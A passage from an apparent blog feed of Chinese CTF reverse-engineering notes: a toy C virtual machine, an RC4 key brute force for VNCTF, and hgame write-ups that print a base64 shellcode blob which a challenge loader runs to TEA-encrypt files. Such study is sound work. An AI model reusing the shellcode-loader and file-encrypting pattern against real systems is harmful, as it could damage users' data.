HLT<span class=\"token operator\">:</span> <span class=\"token comment\">// 停止执行</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>            vm<span class=\"token operator\">-></span>running <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将运行状态置为 0s</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>\t\t\t</pre></td></tr><tr><td data-num=\"178\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>\t<span class=\"token comment\">// 定义一个测试函数，接受一个虚拟机实例作为参数</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">vm_test</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>    <span class=\"token comment\">// 定义一段测试程序 实现一个异或</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>    <span class=\"token keyword\">int</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token number\">78</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">68</span><span class=\"token punctuation\">,</span><span class=\"token number\">44</span><span class=\"token punctuation\">,</span><span class=\"token number\">78</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">79</span><span class=\"token punctuation\">,</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span><span class=\"token number\">67</span><span class=\"token punctuation\">,</span><span class=\"token number\">34</span><span class=\"token punctuation\">,</span><span class=\"token number\">67</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">78</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 瞎输的一串数据</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>    <span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>    for (int i=2; i&lt;16; i+=2)&#123;</pre></td></tr><tr><td data-num=\"186\"></td><td><pre>        data[i+1] = data[i]^data[i+1];</pre></td></tr><tr><td data-num=\"187\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"188\"></td><td><pre>    */</pre></td></tr><tr><td data-num=\"189\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>    vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 读取数据到内存</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> prog<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>MOV<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>R3<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>MOV<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>R4<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>POP<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>POP<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>ALU<span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> R0<span class=\"token punctuation\">,</span> R1<span class=\"token punctuation\">,</span>PUSH<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>POP<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>ALU<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>R3<span class=\"token punctuation\">,</span>R4<span class=\"token punctuation\">,</span>CMP<span class=\"token punctuation\">,</span>R3<span class=\"token punctuation\">,</span>R4<span class=\"token punctuation\">,</span>JNE<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>HLT<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"194\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token function\">vm_load</span><span class=\"token punctuation\">(</span>vm<span class=\"token punctuation\">,</span> prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 加载测试程序到虚拟机内存中，并获取程序长度</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Loaded %d bytes of program.\\n\"</span><span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 打印程序长度</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"197\"></td><td><pre>    <span class=\"token function\">vm_exec</span><span class=\"token punctuation\">(</span>vm<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 执行虚拟机</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"199\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"200\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Register values:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 打印寄存器的值</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"R%d: %d\\n\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d \"</span><span class=\"token punctuation\">,</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 打印内存中的数据</span></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Execution finished.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 打印执行结束</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>\t<span class=\"token function\">vm_test</span><span class=\"token punctuation\">(</span> <span class=\"token function\">vm_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"实现了一个简单的加密\"><a class=\"markdownIt-Anchor\" href=\"#实现了一个简单的加密\">#</a> 实现了一个简单的加密:</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    for (int i=2; i&lt;16; i+=2)&#123;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        data[i+1] = data[i]^data[i+1];</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    */</pre></td></tr></table></figure><p>呜呜呜 本来想用虚拟机实现一个 TEA 加密的 但是这几天得甲流了等我写出来了 再贴上来</p>\n<h2 id=\"lc-3虚拟机\"><a class=\"markdownIt-Anchor\" href=\"#lc-3虚拟机\">#</a> LC-3 虚拟机</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuam1laW5lcnMuY29tL2xjMy12bS8=\">https://www.jmeiners.com/lc3-vm/</span></p>\n",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/02/26/VNCTF/",
            "url": "https://3cly.github.io/2023/02/26/VNCTF/",
            "title": "VNCTF",
            "date_published": "2023-02-26T06:23:40.000Z",
            "content_html": "<h3 id=\"pzgalaxy\"><a class=\"markdownIt-Anchor\" href=\"#pzgalaxy\">#</a> PZGalaxy</h3>\n<p><img data-src=\"/images/image-20230226142653906.png\" alt=\"image.png\"></p>\n<p>根据附件的 md 文件操作打开网站 (本地的话直接点 html 文件) 按 F12 发现 RC4 加密 密文已经给出 密钥共 8 位，给出四位 2023 剩下 4 位爆破即可 注意这里是 js 语言</p>\n<p>我用的火狐浏览器可以 F12 打开开发者工具 在查看器修改 JS 源码</p>\n<p><img data-src=\"/images/image-20230226143924553.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/image-20230226144054689.png\" alt=\"image.png\"></p>\n<p>把后面部分改成爆破后提交就行了</p>\n<p><img data-src=\"/images/image-20230226144152360.png\" alt=\"image.png\"></p>\n<p>这里 flag 和 WP 不一样应该是因为动态 flag 的原因吧</p>\n<p><img data-src=\"/images/image-20230226145023901.png\" alt=\"image.png\"></p>\n<p>一个是 0 一个是 1  0-127</p>\n<p>其实也可以复制数据出来用 python 或者 C 语言爆破</p>\n<p>后面题就没看了 复习考试去了</p>\n",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/02/26/shellcode&&vm/",
            "url": "https://3cly.github.io/2023/02/26/shellcode&&vm/",
            "title": "shellcode&&vm",
            "date_published": "2023-02-26T06:09:59.000Z",
            "content_html": "<p>其实是 hgame week4 的啦</p>\n<h3 id=\"shellcode\"><a class=\"markdownIt-Anchor\" href=\"#shellcode\">#</a> shellcode</h3>\n<p><img data-src=\"/images/image-20230210134708555.png\" alt=\"image.png\"></p>\n<p>DIE 中查看发现为 GO 语言</p>\n<p><img data-src=\"/images/image-20230210135005805.png\" alt=\"image.png\"></p>\n<p>IDA 中查看主函数发现有 base64</p>\n<p>程序逻辑：对 shellcode 进行 base64 解码，然后分配内存，遍历文件夹读文件，调用函数加密，写文件。</p>\n<p><img data-src=\"/images/image-20230210142817599.png\" alt=\"image.png\"></p>\n<p>复制找到的字符串去解密为新文件 (base64 肯定是可见字符呀)</p>\n<p>VUiD7FBIjWwkIEiJTUBIi0VAiwCJRQC4BAAAAEgDRUCLAIlFBMdFCAAAAADHRQwj782rx0UQFgAAAMdFFCEAAADHRRgsAAAAx0UcNwAAAMdFIAAAAACLRSCD+CBzWotFDANFCIlFCItFBMHgBANFEItVCANVBDPCi1UEweoFA1UUM8IDRQCJRQCLRQDB4AQDRRiLVQgDVQAzwotVAMHqBQNVHDPCA0UEiUUEuAEAAAADRSCJRSDrnkiLRUCLVQCJELgEAAAASANFQItVBIkQSI1lMF3D</p>\n<p><img data-src=\"/images/image-20230210142329512.png\" alt=\"image.png\"></p>\n<p>010 编辑器选择粘贴自 base64</p>\n<p><img data-src=\"/images/image-20230210142534042.png\" alt=\"image.png\"></p>\n<p>新文件用 IDA 选择 64 位打开全选后 create function 再按 F5 发现一个 TEA</p>\n<p><img data-src=\"/images/image-20230210142649727.png\" alt=\"image.png\"></p>\n<p>附件的 enc 文件就是加密过的数据 解 TEA 之后就能得到 flag</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x6d616768</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x68747b65</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x315f7331</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x68745f73</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x75745f33</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x73277574</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6d30685f</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x72307765</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7d6b</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4adb98d</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xacb9e545</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">b''</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    flag <span class=\"token operator\">+=</span>long_to_bytes<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#b\"hgame&#123;th1s_1s_th3_tutu's_h0mew0rk&#125;\\x00\\x8d\\xb9\\xad\\x04E\\xe5\\xb9\\xac\"</span></pre></td></tr></table></figure><p>官方总结:</p>\n<p>根据题目名称和提示来看，此题为一个 shellcode 加载器，程序运行过程中会解密一段机器码来运<br>\n行。go 编译的程序主函数为 main_main。观察 ida 反编译出来的内容，可很明显的观察到 base64 解<br>\n码的内容，所以我们将题目中的 base64 解码并保存成文件，使用 ida 打开，即可看出是 tea 加密算<br>\n法。之后再分析题目的文件读取和加密逻辑，发现就是很普通的 8 字节一组调用一次 base64 的机器<br>\n码，所以写解密脚本即可。</p>\n<h3 id=\"vm\"><a class=\"markdownIt-Anchor\" href=\"#vm\">#</a> VM</h3>\n<p>附件为一个 64 位程序 放进 IDA 中</p>\n<p><img data-src=\"/images/image-20230213172010050.png\" alt=\"image.png\"></p>\n<p>在 main 函数中，可以看到第 8 行初始化了 vm 的结构体</p>\n<p><img data-src=\"/images/image-20230213172927883.png\" alt=\"image.png\"></p>\n<p>点开 vm 的主体，可以看到一个 while 循环，byte_140005360 是一个全局数组，该循环在全局数组中按 (a1+24) 下标取的数据只要不是 255 就继续执行，因此该全局数组为 code，就是本虚拟机的字节码数组。而 (a1+24) 应该是 rip 寄存器。</p>\n<p><img data-src=\"/images/image-20230213174104326.png\" alt=\"image.png\"></p>\n<p>进入 sub_140001940 函数 switch-case 结构，这些不同的 case 就对应不同指令了</p>\n<p>点开 case0</p>\n<p><img data-src=\"/images/image-20230213174612440.png\" alt=\"image.png\"></p>\n<p>首先 a1 [6] 就是 (a1+24)  (int 为 4 字节)  也就是 rip   分析猜测为 mov 指令 *a1 是寄存器</p>\n<p>后面分析的时候按照官方 WP 给出的方法在 ida 中新建一个 struct，将 rip 的偏移确定这样好看一点</p>\n<p><img data-src=\"/images/image-20230213180631392.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/image-20230213180716750.png\" alt=\"image.png\"></p>\n<p>再按 Y 改 a1 类型 （是指针的哇）</p>\n<p><img data-src=\"/images/image-20230213181028046.png\" alt=\"image.png\"></p>\n<p>case1 有明显的栈操作的特征，所以此处是 push，而 unknown2 [0] 我们也可以确定是 rsp</p>\n<p>根据分析过程完善定义的 vm 结构体</p>\n<p><img data-src=\"/images/image-20230213181923702.png\" alt=\"image.png\"></p>\n<p>(zf 标志寄存器，用 0 和 1 记录计算结果)</p>\n<p><img data-src=\"/images/image-20230213182227616.png\" alt=\"image.png\"></p>\n<p>再看后面的就很清晰了 case2 为 pop 出栈</p>\n<p><img data-src=\"/images/image-20230213182403514.png\" alt=\"image.png\"></p>\n<p>case3 为进行运算的操作 （wp 直接用 alu 概括了)</p>\n<p><img data-src=\"/images/image-20230213182731775.png\" alt=\"image.png\"></p>\n<p>case4 是 cmp 比较 zf 寄存器记录结果</p>\n<p><img data-src=\"/images/image-20230213182909882.png\" alt=\"image.png\"></p>\n<p>case5 是跳转 jmp</p>\n<p><img data-src=\"/images/image-20230213182952253.png\" alt=\"image.png\"></p>\n<p>case6 是 jne 不相等跳转 (左操作数≠右操作数)</p>\n<p><img data-src=\"/images/image-20230213183618015.png\" alt=\"image.png\"></p>\n<p>case7 是 je 相等跳转 (左操作数 = 右操作数)</p>\n<p>lazy IDA 提取出 data (input) 和字节码数组 写反汇编器把程序转换为汇编语言</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>data<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">155</span><span class=\"token punctuation\">,</span> <span class=\"token number\">168</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">188</span><span class=\"token punctuation\">,</span> <span class=\"token number\">172</span><span class=\"token punctuation\">,</span> <span class=\"token number\">156</span><span class=\"token punctuation\">,</span> <span class=\"token number\">206</span><span class=\"token punctuation\">,</span> <span class=\"token number\">250</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">185</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">232</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">203</span><span class=\"token punctuation\">,</span> <span class=\"token number\">201</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">252</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span> <span class=\"token number\">214</span><span class=\"token punctuation\">,</span> <span class=\"token number\">141</span><span class=\"token punctuation\">,</span> <span class=\"token number\">215</span><span class=\"token punctuation\">,</span> <span class=\"token number\">114</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">167</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">136</span><span class=\"token punctuation\">,</span> <span class=\"token number\">153</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">191</span><span class=\"token punctuation\">,</span> <span class=\"token number\">232</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">201</span><span class=\"token punctuation\">,</span> <span class=\"token number\">169</span><span class=\"token punctuation\">,</span> <span class=\"token number\">189</span><span class=\"token punctuation\">,</span> <span class=\"token number\">139</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">194</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">248</span><span class=\"token punctuation\">,</span> <span class=\"token number\">245</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">213</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">152</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token number\">193</span><span class=\"token punctuation\">,</span> <span class=\"token number\">94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">237</span><span class=\"token punctuation\">,</span> <span class=\"token number\">176</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">167</span><span class=\"token punctuation\">,</span> <span class=\"token number\">253</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">139</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">219</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token number\">143</span><span class=\"token punctuation\">,</span> <span class=\"token number\">156</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token 